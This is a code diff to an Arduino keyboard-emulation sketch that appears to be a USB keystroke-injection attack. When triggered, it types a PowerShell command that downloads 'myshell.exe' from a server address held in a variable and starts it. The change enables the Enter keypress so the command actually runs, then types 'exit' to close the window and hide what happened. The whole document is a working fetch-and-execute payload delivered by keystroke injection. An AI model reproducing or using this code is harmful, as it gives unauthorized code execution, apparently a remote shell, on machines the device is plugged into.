@@ -7,6 +7,7 @@ int check = 0;
 
 String direccion = "192.168.1.1";
 
+
 void typeKey(uint8_t key)
 {
   Keyboard.press(key);
@@ -43,7 +44,8 @@ void loop()
     
     delay(1000);
     Keyboard.print("(new-object System.Net.WebClient).DownloadFile('http://" + direccion + "/myshell.exe', 'myshell.exe'); Start-Process \"myshell.exe\" ");
-    //typeKey(KEY_RETURN);
+    typeKey(KEY_RETURN);  
+    Keyboard.print("exit");
   }
   previousButtonState = buttonState;
 }
